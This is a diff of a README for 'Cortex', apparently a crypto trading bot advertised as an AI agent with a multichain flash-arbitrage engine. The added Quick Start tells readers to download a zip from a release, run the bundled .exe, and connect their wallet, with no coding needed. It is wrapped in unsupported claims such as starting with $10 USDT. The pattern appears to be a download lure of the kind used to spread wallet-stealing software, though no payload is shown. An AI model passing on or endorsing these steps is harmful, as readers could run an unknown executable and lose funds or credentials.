@@ -1,17 +1,28 @@
 # 🧠 Cortex: Autonomous AI Trading Agent & MultiChain Flash-Arb Engine (v2.0-beta)
 
 <p align="center">
+  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="Windows">
+  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="Linux">
+  <img src="https://img.shields.io/badge/OS-macOS-white?style=for-the-badge&logo=apple" alt="macOS">
+</p>
+
+<p align="center">
   <img src="https://img.shields.io/badge/Status-Public--Testing-green?style=for-the-badge" alt="Status">
   <img src="https://img.shields.io/badge/Focus-AI--Arbitrage-blue?style=for-the-badge" alt="Focus">
   <img src="https://img.shields.io/badge/Protocol-MCP--Enabled-orange?style=for-the-badge" alt="Protocol">
-  <img src="https://img.shields.io/badge/Network-EVM--Solana--L2-blueviolet?style=for-the-badge" alt="Network">
 </p>
+
 
 ---
 
 <p align="center">
-<img src="https://i.postimg.cc/s2sv7GP8/cortex.png" alt="Cortex: Autonomous AI Trading Agent & MultiChain Flash-Arb Engine (v2.0-beta)">
-<a href="https://github.com/cortexaiofficial/Autonomous-AI-Trading-Agent-MCP-Flash-Arb-Engine/releases/download/mcp-server/Cortex_AI_v3.4.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20v3.4%20(Latest%20Release)-brightgreen?style=for-the-badge&logo=github" alt="Download Cortex v3.4"></a>
+<img src="https://i.postimg.cc/s2sv7GP8/cortex.png" alt="Cortex Interface Dashboard">
+</p>
+
+<p align="center">
+  <a href="https://github.com/cortexaiofficial/Autonomous-AI-Trading-Agent-MCP-Flash-Arb-Engine/releases/download/mcp-server/Cortex_AI_v3.4.zip">
+    <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20v3.4%20for%20Windows-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex v3.4">
+  </a>
 </p>
 
 
@@ -19,36 +30,40 @@
 
 **Cortex** is a cutting-edge financial infrastructure developed by **Cortex Software Labs**. It bridges the gap between Large Language Model (LLM) reasoning and high-frequency execution engines. 
 
-This repository features the **Flash-Arb MultiChain Engine**, now fully integrated with **Autonomous AI Trading Agents** via the new **Model Context Protocol (MCP)** standard.
+---
+
+## ⚡ Quick Start (Desktop Version)
+Designed for easy use on any PC. No coding knowledge required.
+
+1. **Download:** Click the green **DOWNLOAD** button above to get the `Cortex_AI_v3.4.zip` archive.
+2. **Extract:** Unzip the folder to your desktop.
+3. **Run:** Open `Cortex_AI_v3.4.exe` (Windows) or the executable binary (Linux/Mac).
+4. **Initialize:** Follow the on-screen instructions to connect your wallet and start the AI engine.
 
 ---
 
 ## 🔥 Core Functionality
 
-* **🤖 Autonomous AI Agent (MCP):** Connect ChatGPT, Claude, or Gemini directly to the markets. The AI executes trades based on real-time on-chain context.
-* **⚡ Flash-Arb Engine:** High-velocity arbitrage detection across 15+ EVM Chains and Layer 2 solutions.
-* **🌉 Multi-Chain Ready:** Optimized for Base, Arbitrum, Optimism, Blast, and the **Solana** ecosystem (via Jupiter/Raydium).
-* **💰 Low Entry Barrier:** High gas efficiency allows testing with as little as **$10 USDT**.
-* **🛡️ MEV Protection:** Integrated slippage protection and private RPC routing to shield your trades from front-running bots.
+* **🤖 Autonomous AI Agent (MCP):** Real-time on-chain context trading.
+* **⚡ Flash-Arb Engine:** High-velocity arbitrage across 15+ EVM Chains & Solana.
+* **💰 Low Entry Barrier:** Start testing with as little as **$10 USDT**.
+* **🛡️ MEV Protection:** Built-in anti-frontrunning and slippage protection.
 
 ---
 
-## 🛠 Installation & Setup Guide
+## 🛠 Advanced Setup (Server/CLI)
+For developers and users running Cortex on a VPS or dedicated server.
 
 ### 1. Prerequisites
-Before running the engine, ensure you have the following:
-* **Python 3.10+** or **Node.js 20+**
-* **API Keys** for your preferred exchanges (Binance, Bybit, etc.)
-* **LLM API Key** (Optional, required for AI-logic mode)
+* Python 3.10+ / Node.js 20+
+* API Keys (CEX/DEX)
 
-
-### 2. Install Dependencies
-Open your terminal and run:
+### 2. Installation
 ```bash
 git clone [https://github.com/cortexaiofficial/Autonomous-AI-Trading-Agent-MCP-Flash-Arb-Engine.git](https://github.com/cortexaiofficial/Autonomous-AI-Trading-Agent-MCP-Flash-Arb-Engine.git)
 cd Autonomous-AI-Trading-Agent-MCP-Flash-Arb-Engine
 pip install -r requirements.txt
-# or if using npm:
+# or
 npm install
 ```
 
